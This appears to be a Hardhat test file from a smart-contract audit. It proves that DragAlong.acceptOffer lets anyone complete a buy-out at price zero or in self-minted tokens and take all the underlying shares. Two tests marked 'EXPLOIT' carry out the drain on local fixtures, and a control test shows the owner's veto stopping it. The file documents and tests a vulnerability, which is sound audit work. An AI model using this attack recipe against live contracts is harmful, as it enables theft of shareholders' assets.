import { expect } from "chai";
import { Contract } from "ethers";
import { connection, ethers, owner, signer1, signer3 } from "../../TestBase.ts";
import { deployFixture, mintAndWrap } from "../../Fixtures.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";

// Oracle & flash-loan audit (2026-08-11) — DragAlong.acceptOffer PoC.
//
// DragAlong.acceptOffer (contracts/shares/sha/DragAlong.sol:121) is the buy-out
// settlement of the wrapped share token. It is permissionless (anyone can execute it
// after the 20-day proposal delay) and the acquisition terms are entirely chosen by
// the offerer:
//
//   * the currency is a caller-supplied ERC20 (`latestOffer.currency`), with no
//     validation that it is a real, valuable asset, and
//   * the price per share (`latestOffer.pricePerShareE18`) is not bounded below
//     (0 is accepted; totalPrice = pricePerShareE18 * totalSupply() / 1e18).
//
// At execution the wrapper pays out `base.balanceOf(address(this))` — the ENTIRE
// underlying share position backing every wrapped token (DragAlong.sol:128-131) —
// to the offerer, and replaces the base with the offer currency. Wrapped holders are
// then left with a claim on the (worthless) offer currency only.
//
// The only standing guard is a *vigilance-based* veto: the owner or any holder with
// >10% can cancel during the 20-day window (canCancelOffer, DragAlong.sol:110).
// If nobody cancels, an attacker seizes the whole backing for nothing (price 0) or
// for self-minted worthless tokens. This is the direct analogue of the pre-existing
// "permissionless recovery" finding, but on the buy-out path.

const DETERRENCE_FEE = ethers.parseEther("1"); // deter(100) × 0.01 ether = 1 ETH per offer
const DRAG_PROPOSAL_DELAY = 20n * 24n * 60n * 60n; // 20 days in seconds
const TOTAL_SHARES = 1000n;

async function deployMintableToken(
  symbol: string,
  name: string,
  tokenOwner: string
): Promise<Contract> {
  const Shares = await ethers.getContractFactory(
    "contracts/shares/base/Shares.sol:Shares"
  );
  const t = await Shares.deploy(
    symbol,
    name,
    "https://poc.example/terms",
    tokenOwner
  );
  await t.waitForDeployment();
  return t as unknown as Contract;
}

describe("Finding — DragAlong.acceptOffer: permissionless buy-out lets an attacker take the full underlying share backing for free (or for self-minted tokens)", function () {
  let baseShares: Contract; // the real underlying security token
  let wrapper: Contract; // SharesUnderAgreement wrapping baseShares
  let mine: Contract; // attacker-owned, attacker-mintable "currency"
  let attacker = signer3;

  async function freshWrapper() {
    ({ shares: baseShares, sharesUnderAgreement: wrapper } =
      await connection.networkHelpers.loadFixture(deployFixture));
    // The company's full tokenized share capital is wrapped 1:1.
    await mintAndWrap(baseShares, wrapper, signer1, TOTAL_SHARES);
    // The wrapper now holds the ENTIRE underlying position backing the wrapped supply.
    expect(await baseShares.balanceOf(wrapper)).to.equal(TOTAL_SHARES);
    expect(await wrapper.totalSupply()).to.equal(TOTAL_SHARES);
  }

  async function makeOffer(pricePerShareE18: bigint) {
    const attackerAddr = await attacker.getAddress();
    await setBalance(attackerAddr, ethers.parseEther("2"));
    await wrapper
      .connect(attacker)
      ["offerAcquisition(address,uint256,string)"](
        mine,
        pricePerShareE18,
        "0x",
        { value: DETERRENCE_FEE }
      );
    // 20-day delay, then anyone can execute.
    await connection.networkHelpers.time.increase(DRAG_PROPOSAL_DELAY + 1n);
  }

  beforeEach(async function () {
    await freshWrapper();
    // Attacker controls the "purchase" currency: a token they can mint at will.
    const attackerAddr = await attacker.getAddress();
    mine = await deployMintableToken(
      "MINE",
      "Worthless Payment Token",
      attackerAddr
    );
    await mine.connect(attacker).mint(attackerAddr, TOTAL_SHARES);
    await mine.connect(attacker).approve(wrapper, TOTAL_SHARES);
  });

  it("EXPLOIT: offer priced at 0 — attacker walks away with all 1000 underlying shares for nothing", async function () {
    await makeOffer(0n); // pricePerShareE18 = 0 → totalPrice = 0

    const wrapperBaseBefore = await baseShares.balanceOf(wrapper);
    expect(wrapperBaseBefore).to.equal(TOTAL_SHARES);

    await wrapper.connect(attacker).acceptOffer();

    // Attacker now holds the entire backing; the wrapper holds none.
    expect(await baseShares.balanceOf(attacker)).to.equal(TOTAL_SHARES);
    expect(await baseShares.balanceOf(wrapper)).to.equal(0n);

    // Wrapped holders are left with a claim on the worthless token.
    expect(await wrapper.binding()).to.equal(false);
    expect(await wrapper.base()).to.equal(await mine.getAddress());
    // They never consented to the sale.
    expect(await wrapper.balanceOf(signer1)).to.equal(TOTAL_SHARES);
  });

  it("EXPLOIT: offer priced at 1 self-minted MINE per share — attacker pays only in tokens they mint themselves", async function () {
    await makeOffer(ethers.parseEther("1")); // 1 MINE per share

    const mineBalanceBefore = await mine.balanceOf(attacker);
    const baseBefore = await baseShares.balanceOf(attacker);

    await wrapper.connect(attacker).acceptOffer();

    // Paid 1000 self-minted MINE (worth nothing), received 1000 real shares.
    expect(await mine.balanceOf(attacker)).to.equal(
      mineBalanceBefore - TOTAL_SHARES
    );
    expect(await baseShares.balanceOf(attacker)).to.equal(
      baseBefore + TOTAL_SHARES
    );
    expect(await baseShares.balanceOf(wrapper)).to.equal(0n);
  });

  it("control: the only protection is a vigilance-based veto — an attentive owner cancels in time", async function () {
    await wrapper
      .connect(attacker)
      ["offerAcquisition(address,uint256,string)"](mine, 0n, "0x", {
        value: DETERRENCE_FEE,
      });

    // Owner vetoes before the delay elapses: takeover blocked.
    await wrapper.connect(owner).cancelOffer("not a real offer");
    expect(await wrapper.latestOffer().then((o: any) => o.buyer)).to.equal(
      ethers.ZeroAddress
    );

    // With the offer gone, acceptOffer reverts.
    await expect(
      wrapper.connect(attacker).acceptOffer()
    ).to.be.revertedWithCustomError(wrapper, "NoOfferFound");
    // And the backing is untouched.
    expect(await baseShares.balanceOf(wrapper)).to.equal(TOTAL_SHARES);
  });
});
